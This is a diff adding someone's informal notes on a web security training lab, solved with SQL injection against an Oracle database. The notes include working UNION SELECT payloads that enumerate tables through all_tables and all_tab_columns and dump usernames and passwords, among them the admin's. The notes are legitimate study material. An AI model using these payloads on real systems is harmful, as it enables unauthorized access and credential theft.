@@ -1,1 +1,39 @@
+same as previous lab but for oracle database
 
+here the things like ' (breaking page), OR 1=1, 1=2,2=2,2=1 amd union select NULL,NULL works so sqli possible.
+
+to get the version as well same and is working
+
+now for getting database cols and their name
+
+in oracle there is a default table called dual
+
+we must run select * FROM TABLE WHERE. here in oracle the FROM is compulsory otherwise it will not work
+
+but got to know that dual does not contain the metadata of the oracle database it is stored in the 'all_tables' instead of 'dual'
+
+so tried running the querry: 'UNION SELECT NULL,NULL FROM all_tables
+
+it worked
+
+now i had to find the tables name from it and in oracle information_schema.column or information_schema.table does not work. in oracle there is a keyword works: all_tab_columns
+
+to find the all table list i ran the querry: 'UNION SELECT NULL,table_name FROM all_tab_columns--+
+
+i randomly put the table_name here just to try without knowing the oracle syntax.
+
+it worked. got the list of all the tables
+
+from that table list there is one table name that stood out to me : USERS_CLRRKV
+
+so to pull the cols name in this table we tried this querry:
+'UNION SELECT NULL,column_name FROM all_tab_columns WHERE TABLE_NAME='USERS_CLRRKV'--+
+
+this gave cols with username_xxxx and password_xxxxx
+
+so from this i tried to get the data from those cols. 
+'UNION SELECT USERNAME_YIOYZF,PASSWORD_CPAQPW FROM USERS_CLRRKV--+
+
+this gave 3 users name and password which included the admin's password
+
+logined with the admin credintials and just put the ' at the end of that querry which solved the lab
